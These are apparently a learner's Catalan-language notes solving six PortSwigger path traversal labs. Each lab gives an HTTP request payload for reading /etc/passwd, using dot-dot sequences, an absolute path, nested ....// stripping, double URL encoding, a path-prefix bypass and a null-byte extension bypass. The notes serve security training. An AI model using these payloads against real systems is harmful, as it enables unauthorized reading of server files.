# DIRECTORY TRAVERSAL LABS: https://portswigger.net/web-security/file-path-traversal

### TOTS els Path Traversal es faran en el paràmetre de les imatges

## **Lab 1**: File path traversal, simple case

    - TENIM: GET /image?filename=16.jpg HTTP/1.1
    - POSEM: GET /image?filename=../../../../../../../../etc/passwd HTTP/1.1

## **Lab 2**: File path traversal, traversal sequences blocked with absolute path bypass

    - TENIM: GET /image?filename=30.jpg HTTP/1.1
    - POSEM: GET /image?filename=/etc/passwd HTTP/1.

## **Lab 3**: File path traversal, traversal sequences stripped non-recursively

    - TENIM: GET /image?filename=40.jpg HTTP/1.1
    - POSEM: GET /image?filename=....//....//....//....//....//....//....//etc/passwd HTTP/1.1

## **Lab 4**: File path traversal, traversal sequences stripped with superfluous URL-decode

    - TENIM: GET /image?filename=11.jpg HTTP/1.1
        FEM: GET /image?filename=../etc/passwd HTTP/1.1 i la barra '/' li fem un URL DECODER
        (Burpsuite: seleccionem la / >  click dret > convert selection > URL > URL Encode All Characters)
        ARA TENIM: GET /image?filename=..%2fetc/passwd HTTP/1.1
        Fem el mateix amb el '%'.
        ARA TENIM: GET /image?filename=..%252fetc/passwd HTTP/1.1
    - POSEM: GET /image?filename=..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1
## **Lab 5**: File path traversal, validation of start of path

    - TENIM: GET /image?filename=/var/www/images/21.jpg HTTP/1.1
    - POSEM: GET /image?filename=/var/www/images/../../../../../../../etc/passwd HTTP/1.1

## **Lab 6**: File path traversal, validation of file extension with null byte bypass

    - TENIM: GET /image?filename=20.jpg HTTP/1.1
    - POSEM: GET /image?filename=../../../../../../../etc/passwd%00.jpg HTTP/1.1 (concepte de 'null byte')